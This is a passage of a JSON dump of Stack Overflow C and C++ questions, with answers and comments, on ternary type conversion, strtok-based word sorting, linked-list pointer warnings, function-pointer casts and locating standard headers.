<p>Are both of these statements equivalent?</p>\n</blockquote>\n\n<p>With variant types: possibly no.</p>\n\n<p>Example: The <code>a ? b : c</code> causes <code>b</code> and <code>c</code> to covert to a common type, yet not so with <code>if then else</code>.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\ndouble foo(int x1, float x2, int x3) {\n  // Inexact conversions to float      vv                      vv\n  return (x1 &gt; x2) ? ((x1 &gt; x3) ? x1 : x3) : ((x2 &gt; x3) ? x2 : x3);\n}\n\ndouble bar(int x1, float x2, int x3) {\n  if (x1 &gt; x2) {\n    if (x1 &gt; x3) {\n      return x1;\n    } else {\n      return x3;\n    }\n  } else if (x2 &gt; x3) {\n    return x2;\n  } else\n    return x3;\n}\n\nint main(void) {\n  printf(\"%f\\n\", foo(INT_MAX, 1.0f, 0));\n  printf(\"%f\\n\", bar(INT_MAX, 1.0f, 0));\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>2147483648.000000\n2147483647.000000\n</code></pre>\n\n<hr>\n\n<p>Or possibly a compiler error under both approaches.</p>\n\n<pre><code>double foo2(int x1, float x2, int *x3) {\n  // error: invalid operands to binary &gt; (have 'float' and 'int *')\n  return (x1 &gt; x2) ? ((x1 &gt; x3) ? x1 : x3) : ((x2 &gt; x3) ? x2 : x3);\n}\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 10706674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/135f00303d4c7c965dff2d9468f07859?s=128&d=identicon&r=PG&f=1", "display_name": "livelive96", "link": "https://stackoverflow.com/users/10706674/livelive96"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 1, "answer_count": 3, "score": 2, "last_activity_date": 1551872343, "creation_date": 1551833564, "last_edit_date": 1551834360, "question_id": 55013867, "link": "https://stackoverflow.com/questions/55013867/are-both-of-these-statements-equivalent", "title": "Are both of these statements equivalent?", "body": "<p>statement 1 </p>\n\n<pre><code>return (x1 &gt; x2) ? ((x1 &gt; x3) ? x1: x3): ((x2 &gt; x3) ? x2: x3);\n</code></pre>\n\n<p>statement 2</p>\n\n<pre><code>if(x1&gt;x2){\n    if(x1&gt;x3){\n        return x1;\n    }\n    else{\n        return x3;\n    }\n}\nelse if(x2&gt;x3){\n    return x2;\n}\nelse return x3;\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3, "user_id": 11156930, "user_type": "registered", "profile_image": "https://graph.facebook.com/10161569683700788/picture?type=large", "display_name": "Michael Bacha", "link": "https://stackoverflow.com/users/11156930/michael-bacha"}, "edited": false, "score": 0, "creation_date": 1551833265, "post_id": 55013745, "comment_id": 96782238, "body": "its in c language"}], "answers": [{"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 0, "last_activity_date": 1551838107, "last_edit_date": 1551838107, "creation_date": 1551837646, "answer_id": 55014396, "question_id": 55013745, "link": "https://stackoverflow.com/questions/55013745/separating-and-lexically-ordering-strings/55014396#55014396", "title": "Separating and lexically ordering strings", "body": "<p>Make an array of \"strings\" (that is, pointers to char arrays) and sort the array with <a href=\"http://man7.org/linux/man-pages/man3/qsort.3.html\" rel=\"nofollow noreferrer\"><code>qsort</code></a>. Then you can print it in order.</p>\n\n<p>You can populate your aray with the pointers returned from <a href=\"http://man7.org/linux/man-pages/man3/strtok.3.html\" rel=\"nofollow noreferrer\"><code>strtok</code></a>; there's no need to copy the words. But please note that <code>strtok</code> will destroy the string passed as an argument, so it might have been a good idea to have copied that string before unleashing <code>strtok</code> on it. That would let you define your function to take a <code>const char*</code> argument, allowing you to call it with a string literal. In general, it's better interface design to always use <code>const char*</code> as the prototype for a function taking a string(unless the purpose of the function is to modify the string.)</p>\n"}], "owner": {"reputation": 3, "user_id": 11156930, "user_type": "registered", "profile_image": "https://graph.facebook.com/10161569683700788/picture?type=large", "display_name": "Michael Bacha", "link": "https://stackoverflow.com/users/11156930/michael-bacha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 43, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1551838107, "creation_date": 1551832509, "last_edit_date": 1551833368, "question_id": 55013745, "link": "https://stackoverflow.com/questions/55013745/separating-and-lexically-ordering-strings", "title": "Separating and lexically ordering strings", "body": "<p>I'm supposed to create a function that will print each word from a string to a new line, but it's also supposed to be sorted in lexicographically and that is where I'm stumped. I know how to sort lexicographically if each word were inputted manually by the user (<code>scanf()</code>), but if I am using my own string sentence, I'm lost on how to start this. I know I'm supposed to use <code>strcmp()</code> when it comes to comparing strings, but how do I compare each word when the string is \"layed out like this\"?</p>\n\n<p>This is what I have so far:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid ParseSentence ( char string[] );\n\nint main()\n{\n    char s[100];\n\n    strcpy ( s , \"hello world, how are you today.\");\n\n    printf(\"%s\\n\", s);\n\n    ParseSentence ( s );\n}\n\n/*Objective: Isolates the words in a string, printing them on separate lines \nand omitting any deliminators*/\n/*Input: A string of choice is passed as a character array*/\n/*Output: void*/ \nvoid ParseSentence( char string[])\n{\n    char *tokenPtr, *DelimList = \", ;.\";\n\n    tokenPtr = strtok(string, DelimList);\n\n    while (tokenPtr != NULL)\n    {\n        printf(\"%s \\n\", tokenPtr);\n        tokenPtr = strtok(NULL, DelimList);\n    }\n\n    return;\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "casting", "linked-list"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551830457, "post_id": 55013315, "comment_id": 96781578, "body": "See <a href=\"https://stackoverflow.com/questions/750178/\">Is it a good idea to typedef pointers?</a> \u2014 TL;DR, the answer is generally &quot;No&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 293, "user_id": 7177271, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-8EkKHDl-kgU/AAAAAAAAAAI/AAAAAAAAABY/x2USaUE1k-o/photo.jpg?sz=128", "display_name": "Bret Hasel", "link": "https://stackoverflow.com/users/7177271/bret-hasel"}, "edited": false, "score": 0, "creation_date": 1551857753, "post_id": 55013386, "comment_id": 96789188, "body": "ahh okay i think i understand a bit better now where i was going wrong, but im still a little confused on how to resolve this issue without entirely rewriting my code. would deferencing temp work to solve this issue? When i attempt to do this it gives me a read-only location error"}], "tags": [], "owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "is_accepted": true, "score": 1, "last_activity_date": 1551830007, "last_edit_date": 1551830007, "creation_date": 1551829686, "answer_id": 55013386, "question_id": 55013315, "link": "https://stackoverflow.com/questions/55013315/incompatible-pointer-type-and-return-makes-integer-without-a-cast-issue/55013386#55013386", "title": "Incompatible pointer type and return makes integer without a cast issue", "body": "<p>Looking at the line</p>\n\n<pre><code>temp=(*temp)-&gt;next;\n</code></pre>\n\n<p><code>temp</code> is defined as <code>const listitemptr *temp</code>, meaning its type is <code>const listitemptr *</code>.</p>\n\n<p>To find the type of <code>(*temp)-&gt;next</code>, we can look at its pieces. We already know <code>temp</code> is a <code>const listitemptr *</code>, so de-referencing it results in a <code>listitemptr</code>.</p>\n\n<p>Looking at your source, we can then find the type of <code>next</code>,</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>struct listitem {\n  listitemptr next;   // pointer to next item \n};\n</code></pre>\n\n<p>now we can see that <code>next</code>, and therefore <code>(*temp)-&gt;next</code>, has the type <code>listitemptr</code>.</p>\n\n<p>So you are assigning a <code>listitemptr</code> to a <code>const listitemptr *</code>.</p>\n\n<p>It looks like most of these errors are caused by confusing <code>listitemptr</code> for a pointer to <code>listitemptr*</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551830373, "post_id": 55013423, "comment_id": 96781560, "body": "It&#39;s more likely <code>((void *)0)</code>, but that&#39;s part of the problem.  And the <code>return *knapsack;</code> from a function returning an <code>int</code> requires <code>listitemptr</code> to be an <code>int</code>."}, {"owner": {"reputation": 311, "user_id": 6395379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dce74c7c5b1397847d5d71a2ae27d132?s=128&d=identicon&r=PG&f=1", "display_name": "Philip L", "link": "https://stackoverflow.com/users/6395379/philip-l"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551830953, "post_id": 55013423, "comment_id": 96781708, "body": "Fixed, although [<a href=\"https://www.tutorialspoint.com/c_standard_library/c_macro_null.htm]\" rel=\"nofollow noreferrer\">tutorialspoint.com/c_standard_library/c_macro_null.htm]</a> says ((char*)0). I wonder what compiler they looked into :)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1551831093, "post_id": 55013423, "comment_id": 96781750, "body": "I&#39;m not sure which site is &#39;this site&#39; \u2026 oh, you updated it: Tutorials Point doesn&#39;t have a particularly strong reputation here on SO, and this sort of thing could be a reason for that.  However, the description does say <i>&quot;The C library Macro <code>NULL</code> is the value of a null pointer constant. It may be defined as <code>((void*)0)</code>, <code>0</code> or <code>0L</code> depending on the compiler vendor.&quot;</i>   And then also lists <code>((char *)0)</code> to confuse. Back in the days of pre-standard C (meaning the 80s or earlier), there was no <code>void *</code> type and <code>char *</code> was the universal pointer. That is, however, about 30 years out of date."}, {"owner": {"reputation": 293, "user_id": 7177271, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-8EkKHDl-kgU/AAAAAAAAAAI/AAAAAAAAABY/x2USaUE1k-o/photo.jpg?sz=128", "display_name": "Bret Hasel", "link": "https://stackoverflow.com/users/7177271/bret-hasel"}, "edited": false, "score": 0, "creation_date": 1551862619, "post_id": 55013423, "comment_id": 96791735, "body": "realized the mistake with the first two warnings but how would i go about fixing the last warning with <code>knapsack = (*present)-&gt;next</code> without having to break and rewrite my whole code? kinda confused on that part still but thank you for clearing that up!"}], "tags": [], "owner": {"reputation": 311, "user_id": 6395379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dce74c7c5b1397847d5d71a2ae27d132?s=128&d=identicon&r=PG&f=1", "display_name": "Philip L", "link": "https://stackoverflow.com/users/6395379/philip-l"}, "is_accepted": false, "score": 2, "last_activity_date": 1551830854, "last_edit_date": 1551830854, "creation_date": 1551829899, "answer_id": 55013423, "question_id": 55013315, "link": "https://stackoverflow.com/questions/55013315/incompatible-pointer-type-and-return-makes-integer-without-a-cast-issue/55013423#55013423", "title": "Incompatible pointer type and return makes integer without a cast issue", "body": "<p>Regarding the warning - </p>\n\n<pre><code>knapsack.c:37:16: warning: return makes integer from pointer without a cast [-Wint-conversion]\n     return NULL;\n</code></pre>\n\n<p>The definition of NULL is compiler dependent, probably in your compiler <code>NULL</code> is defined as <code>(void*)0</code>, therefore you are trying to return a pointer but your function is defined as <code>int KnapsackRemove(...)</code> so it expects an int value to be returned.</p>\n\n<p>Regarding - </p>\n\n<pre><code>knapsack.c:59:12: warning: return makes integer from pointer without a cast [-Wint-conversion]\n return *knapsack;\n</code></pre>\n\n<p>You are trying to return a <code>listitemptr</code> type from a function returning an int.</p>\n\n<p>regarding the other warnings, you are trying to assign <code>listitemptr</code> to a <code>listitemptr*</code> type. <code>(*present)-&gt;next</code> is of type <code>listitemptr</code> and <code>knapsack</code> is of type <code>listitemptr*</code>.</p>\n"}], "owner": {"reputation": 293, "user_id": 7177271, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-8EkKHDl-kgU/AAAAAAAAAAI/AAAAAAAAABY/x2USaUE1k-o/photo.jpg?sz=128", "display_name": "Bret Hasel", "link": "https://stackoverflow.com/users/7177271/bret-hasel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 131, "favorite_count": 0, "accepted_answer_id": 55013386, "answer_count": 2, "score": 2, "last_activity_date": 1551830854, "creation_date": 1551829127, "question_id": 55013315, "link": "https://stackoverflow.com/questions/55013315/incompatible-pointer-type-and-return-makes-integer-without-a-cast-issue", "title": "Incompatible pointer type and return makes integer without a cast issue", "body": "<p>I'm attempting to create a knapsack program out of the use of linked list but ive run into an issue that i can quite figure out. In nearly all of my functions im getting this error on the same line of an incompatible pointer type and i'm confused on how to fix it. The other issue im running into is a <code>return makes integer from pointer without a cast</code> errors. Full code and errors below. The error lies in the <code>knapsack.c</code> file, <code>test_knapsack.c</code> is just given for a main function example for testing purposes.</p>\n\n<p><strong>ERRORS</strong></p>\n\n<pre><code>knapsack.c: In function \u2018KnapsackRemove\u2019:\nknapsack.c:37:16: warning: return makes integer from pointer without a cast [-Wint-conversion]\n         return NULL;\n                ^\nknapsack.c:47:29: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]\n                     knapsack=(*present)-&gt;next;\n\nknapsack.c:59:12: warning: return makes integer from pointer without a cast [-Wint-conversion]\n     return *knapsack;\n            ^\nknapsack.c: In function \u2018KnapsackPrint\u2019:\nknapsack.c:69:17: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]\n             temp=(*temp)-&gt;next;\n                 ^\nknapsack.c: In function \u2018KnapsackItemCount\u2019:\nknapsack.c:82:13: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]\n         temp=(*temp)-&gt; next;\n             ^\nknapsack.c: In function \u2018KnapsackSize\u2019:\nknapsack.c:94:13: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]\n         temp=(*temp)-&gt; next;\n</code></pre>\n\n<p><strong>knapsack.c</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"knapsack.h\"\n#include &lt;stdlib.h&gt;\n\nlistitemptr KnapsackAdd(listitemptr *knapsack, int item){\n    if(knapsack == NULL){\n        listitemptr newer = (listitemptr)malloc(sizeof(listitemptr));\n        newer-&gt; item = item;\n        newer-&gt; count = 1;\n        newer-&gt; next = NULL;\n        return newer;\n    }else{\n        listitemptr *temp = knapsack;\n        listitemptr previous = NULL;\n        while(temp!= NULL){\n            if((*temp)-&gt;item == item){\n                (*temp)-&gt;count=(*temp)-&gt;count+1;\n                break;\n            }\n            previous = *temp;\n            *temp = (*temp)-&gt;next;\n        }\n        if(temp == NULL){\n            listitemptr newer = (listitemptr)malloc(sizeof(listitemptr));\n            newer-&gt;item = item;\n            newer-&gt;count =1;\n            newer-&gt;next = NULL;\n            previous-&gt;next = newer;\n            return newer;\n        }\n        return *temp;\n    }\n}\n\nint KnapsackRemove(listitemptr *knapsack, int item){\n    if(knapsack==NULL)\n        return NULL;\n    listitemptr *present = knapsack;\n    listitemptr previous = NULL;\n\n    while(present != NULL){\n        if((*present)-&gt;item == item){\n            if((*present)-&gt; count &gt; 1){\n                (*present)-&gt;count=(*present)-&gt;count-1;\n            }else{\n                if(previous==NULL){\n                    knapsack=(*present)-&gt;next;\n                }else{\n                    previous-&gt;next=(*present)-&gt;next;\n                    free(present);\n                }\n            }\n            break;\n        }\n        previous=*present;\n        *present=(*present)-&gt;next;\n    }\n\n    return *knapsack;\n}\n\nvoid KnapsackPrint(const listitemptr *knapsack){\n    if(knapsack == NULL)\n        printf(\"(nothing)\\n\");\n    else{\n       const listitemptr *temp = knapsack;\n        while(temp!= NULL){\n            printf(\"%d (%d), \",(*temp)-&gt;item, (*temp)-&gt;count);\n            temp=(*temp)-&gt;next;\n        }\n        printf(\"\\n\");\n    }\n}\n\nunsigned int KnapsackItemCount(const listitemptr *knapsack, int item){\n    if(knapsack== NULL)\n        return 0;\n    const listitemptr *temp = knapsack;\n    while(temp != NULL){\n        if((*temp)-&gt; item== item)\n            return (*temp)-&gt; count;\n        temp=(*temp)-&gt; next;\n    }\n    return 0;\n}\n\nunsigned int KnapsackSize(const listitemptr *knapsack){\n    if(knapsack == NULL)\n        return 0;\n   const listitemptr *temp = knapsack;\n    unsigned int sum = 0;\n    while(temp!= NULL){\n        sum+= (*temp)-&gt; count;\n        temp=(*temp)-&gt; next;\n    }\n    return sum;\n}\n</code></pre>\n\n<p><strong>knapsack.h</strong></p>\n\n<pre><code>/* knapsack.h\n * implements simple knapsack data structure as a linked list \n * NOTE: a function may update the value of input argument *knapsack if it changes the first node of the knapsack to another node. Such a change include the case when an item is added to an empty knapsack\n */\n\ntypedef struct listitem* listitemptr;\n\n\nstruct listitem {\n  int item;           // actual int item\n  unsigned int count; // number of the same item in the knapsack; should be &gt;= 1\n  listitemptr next;   // pointer to next item \n};\n\n\nlistitemptr KnapsackAdd(listitemptr *knapsack, int item);\n\n\nint KnapsackRemove(listitemptr *knapsack, int item);\n\n\nvoid KnapsackPrint(const listitemptr *knapsack);\n\n\nunsigned int KnapsackItemCount(const listitemptr *knapsack, int item);\n\n\nunsigned int KnapsackSize(const listitemptr *knapsack);\n</code></pre>\n\n<p><strong>test_knapsack.c</strong></p>\n\n<pre><code>#include \"knapsack.h\"\n#include &lt;stdio.h&gt;\n#include &lt;assert.h&gt;\n\nint main(){\n   //knapsack k1\n   listitemptr head=KnapsackAdd(NULL,10);\n   KnapsackAdd(&amp;head,-20);\n   KnapsackAdd(&amp;head,10);\n   KnapsackAdd(&amp;head,15);\n   KnapsackAdd(&amp;head,-20);\n   KnapsackAdd(&amp;head,10);\n\n   KnapsackPrint(&amp;head);\n\n   int count=KnapsackItemCount(&amp;head,10);\n   assert(count==3);\n\n   count=KnapsackItemCount(&amp;head,8);\n   assert(count==0);\n\n   count=KnapsackSize(&amp;head);\n   assert(count==6);\n\n   //knapsack2\n   listitemptr head2=KnapsackAdd(NULL,5);\n   KnapsackAdd(&amp;head2,10);\n   KnapsackAdd(&amp;head2,15);\n   KnapsackAdd(&amp;head2,20);\n   KnapsackAdd(&amp;head2,-5);\n\n\n   KnapsackPrint(&amp;head2);\n\n   KnapsackRemove(&amp;head2,15);\n   count=KnapsackSize(&amp;head2);\n   assert(count==4);\n\n   count=KnapsackItemCount(&amp;head2,15);\n   assert(count==0);\n\n   KnapsackRemove(&amp;head2,10);\n   count=KnapsackSize(&amp;head2);\n   assert(count==3);\n\n   KnapsackAdd(&amp;head,10);\n\n   count=KnapsackSize(&amp;head2);\n   assert(count==3);\n\n   count=KnapsackSize(&amp;head);\n   assert(count==7);   \n\n\n   return 0;\n   }\n</code></pre>\n"}, {"tags": ["c++", "c", "casting", "function-pointers"], "comments": [{"owner": {"reputation": 56117, "user_id": 845092, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/50ccdbac5f0f9ff683e4b30a248189bf?s=128&d=identicon&r=PG", "display_name": "Mooing Duck", "link": "https://stackoverflow.com/users/845092/mooing-duck"}, "edited": false, "score": 0, "creation_date": 1551829218, "post_id": 55013274, "comment_id": 96781226, "body": "How certain are you that the <code>callback_function</code> is really supposed to be an <code>int (*)(int)</code>?"}, {"owner": {"reputation": 10963, "user_id": 306257, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/701752cfc3dd805d412884f38a464296?s=128&d=identicon&r=PG", "display_name": "Haldean Brown", "link": "https://stackoverflow.com/users/306257/haldean-brown"}, "edited": false, "score": 0, "creation_date": 1551829296, "post_id": 55013274, "comment_id": 96781252, "body": "Hi AT_BN! I think this Q/A might answer your question: <a href=\"https://stackoverflow.com/questions/1096341/function-pointers-casting-in-c\">Function pointers casting in C++</a>"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1551829399, "post_id": 55013274, "comment_id": 96781282, "body": "You should also read about <a href=\"https://stackoverflow.com/q/3404372/1553090\">stdcall and cdecl</a>"}], "owner": {"reputation": 31, "user_id": 11156752, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-6pBC9xgJLVE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rf4gu274i6lNj4hxqBtAI4959-hqQ/mo/photo.jpg?sz=128", "display_name": "AT_BN", "link": "https://stackoverflow.com/users/11156752/at-bn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 64, "favorite_count": 0, "closed_date": 1551829350, "answer_count": 0, "score": 3, "last_activity_date": 1551828800, "creation_date": 1551828800, "question_id": 55013274, "link": "https://stackoverflow.com/questions/55013274/passing-c-function-as-argument-to-c-function-that-takes-void-void-pointer", "closed_reason": "Duplicate", "title": "Passing c++ function as argument to c function that takes void* (void pointer)", "body": "<p>I have a c library function with the prototype:</p>\n\n<pre><code>int setCallback(void* callback_function);\n</code></pre>\n\n<p>It can accept a c function that matches</p>\n\n<pre><code>int myCallback(int x);\nsetCallBack(myCallback);  // register function as callback\n</code></pre>\n\n<p>Now, I want to use this c library in a c++ project, and have it call a c++ function defined in a namespace. Passing the equivalent c++ function however, gives the error with g++ 5.4.0:</p>\n\n<pre><code>setCallBack(myCPPCallBack);  // ERROR!\ninvalid conversion from \u2018int (*)(int)\u2019 to \u2018void*\u2019 [-fpermissive]\n</code></pre>\n\n<p>I can get it to build and run this by doing the following cast.</p>\n\n<pre><code>setCallBack((void*)myCPPCallBack);\n</code></pre>\n\n<p>My question is, is this undefined behavior or otherwise unwise to do so? What are the risks, and is there an alternative?</p>\n"}, {"tags": ["c", "c-header"], "comments": [{"owner": {"reputation": 507, "user_id": 2654727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c319a24a493153df59e86b43ff78fde0?s=128&d=identicon&r=PG", "display_name": "Tom Drake", "link": "https://stackoverflow.com/users/2654727/tom-drake"}, "edited": false, "score": 0, "creation_date": 1551827325, "post_id": 55012968, "comment_id": 96780753, "body": "You might try looking <a href=\"https://en.cppreference.com/w/c/header\" rel=\"nofollow noreferrer\">at this reference</a>"}, {"owner": {"reputation": 622, "user_id": 4365840, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1UTe1.png?s=128&g=1", "display_name": "Amadeu Antunes", "link": "https://stackoverflow.com/users/4365840/amadeu-antunes"}, "edited": false, "score": 0, "creation_date": 1551827399, "post_id": 55012968, "comment_id": 96780773, "body": "<a href=\"https://www.tutorialspoint.com/c_standard_library/\" rel=\"nofollow noreferrer\">tutorialspoint.com/c_standard_library</a>"}, {"owner": {"reputation": 26377, "user_id": 7734, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/ced37e94f2fabfd8b4bb78e573947a68?s=128&d=identicon&r=PG", "display_name": "EvilTeach", "link": "https://stackoverflow.com/users/7734/evilteach"}, "edited": false, "score": 2, "creation_date": 1551827464, "post_id": 55012968, "comment_id": 96780786, "body": "Google is your friend. &quot;In C, what include file is needed for the function printf&quot;"}, {"owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "reply_to_user": {"reputation": 26377, "user_id": 7734, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/ced37e94f2fabfd8b4bb78e573947a68?s=128&d=identicon&r=PG", "display_name": "EvilTeach", "link": "https://stackoverflow.com/users/7734/evilteach"}, "edited": false, "score": 1, "creation_date": 1551827885, "post_id": 55012968, "comment_id": 96780897, "body": "@EvilTeach but how long until google crawls this page, decides it is a better match for the search phrase and starts to return this page as the top result?"}, {"owner": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "reply_to_user": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "edited": false, "score": 0, "creation_date": 1551832730, "post_id": 55012968, "comment_id": 96782127, "body": "@IncreasinglyIdiotic Look at the results starting from the second one?"}, {"owner": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "reply_to_user": {"reputation": 4562, "user_id": 9254539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b45538511384660bfaef5092e30b7ea?s=128&d=identicon&r=PG&f=1", "display_name": "BessieTheCookie", "link": "https://stackoverflow.com/users/9254539/bessiethecookie"}, "edited": false, "score": 1, "creation_date": 1551843851, "post_id": 55012968, "comment_id": 96784607, "body": "@FeiXiang just saying that seeing &quot;Just google it&quot; can be frustrating because Google (eventually) ends up prioritizing StackOverflow links most of the time. So somewhere down the line the top link ends up being a StackOverflow post with the exact question I search but the answer tells me to &quot;Just google it&quot;."}, {"owner": {"reputation": 26377, "user_id": 7734, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/ced37e94f2fabfd8b4bb78e573947a68?s=128&d=identicon&r=PG", "display_name": "EvilTeach", "link": "https://stackoverflow.com/users/7734/evilteach"}, "edited": false, "score": 0, "creation_date": 1551881174, "post_id": 55012968, "comment_id": 96802892, "body": "I have looked for a page that documents all of the headers for all of the functions for all of the platforms I care about.   I don&#39;t think there is one.  I can grep the headers on my system, or use Google.  Most of the time, Google gets me to the answer faster."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551985582, "post_id": 55012968, "comment_id": 96852026, "body": "if working on a OS/shell that contains the <code>man</code> command, you can (at the command prompt) enter: <code>man commandNameOfInterest</code>  and the MAN page for that command will be displayed. (note: some commands are spelled the same in both the shell and in C, so may need to include the optional number of the MAN page group where the command is described.)  In each MAN page (other than the page for the shell commands) is a list of the header files needed"}], "answers": [{"comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 3, "creation_date": 1551827272, "post_id": 55013010, "comment_id": 96780738, "body": "You linked a website for C++, which doesn&#39;t include many of the C99 or any of the C11 standard library headers"}, {"owner": {"reputation": 35, "user_id": 11156662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b84fcbfccdda839b85479f1559439c2a?s=128&d=identicon&r=PG&f=1", "display_name": "Jackpot", "link": "https://stackoverflow.com/users/11156662/jackpot"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 1, "creation_date": 1551827321, "post_id": 55013010, "comment_id": 96780752, "body": "it is a C library do look closely"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 1, "creation_date": 1551827392, "post_id": 55013010, "comment_id": 96780772, "body": "No it is not. It only includes a subset of the C standard library, which is not already included in the C++ standard library. <a href=\"https://en.cppreference.com/w/c/header\" rel=\"nofollow noreferrer\">en.cppreference.com/w/c/header</a> has a better list"}], "tags": [], "owner": {"reputation": 35, "user_id": 11156662, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b84fcbfccdda839b85479f1559439c2a?s=128&d=identicon&r=PG&f=1", "display_name": "Jackpot", "link": "https://stackoverflow.com/users/11156662/jackpot"}, "is_accepted": false, "score": -2, "last_activity_date": 1551827031, "creation_date": 1551827031, "answer_id": 55013010, "question_id": 55012968, "link": "https://stackoverflow.com/questions/55012968/c-how-can-i-know-what-header-do-i-need-for-the-functions-i-am-using/55013010#55013010", "title": "C: How can I know what header do I need for the functions I am using?", "body": "<p>Use this as reference <a href=\"http://www.cplusplus.com/reference/clibrary/\" rel=\"nofollow noreferrer\">C library reference</a>, to your code to work use this</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 565, "user_id": 11120993, "user_type": "registered", "profile_image": 